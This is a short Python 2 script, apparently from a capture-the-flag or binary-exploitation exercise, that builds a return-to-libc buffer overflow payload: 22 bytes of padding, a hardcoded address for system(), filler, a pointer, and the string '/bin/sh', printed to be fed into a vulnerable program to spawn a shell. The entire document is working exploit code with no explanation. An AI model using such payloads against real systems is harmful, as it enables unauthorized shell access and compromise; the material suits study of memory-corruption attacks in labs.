from struct import pack 

system_addr = 0x804a030
ebp = 0xbffe918
bin_addr = 0xbffe9a08

print '\x61'*22 + pack("<I",system_addr) + '\x61'*4 + pack("<I", bin_addr) + "/bin/sh"    



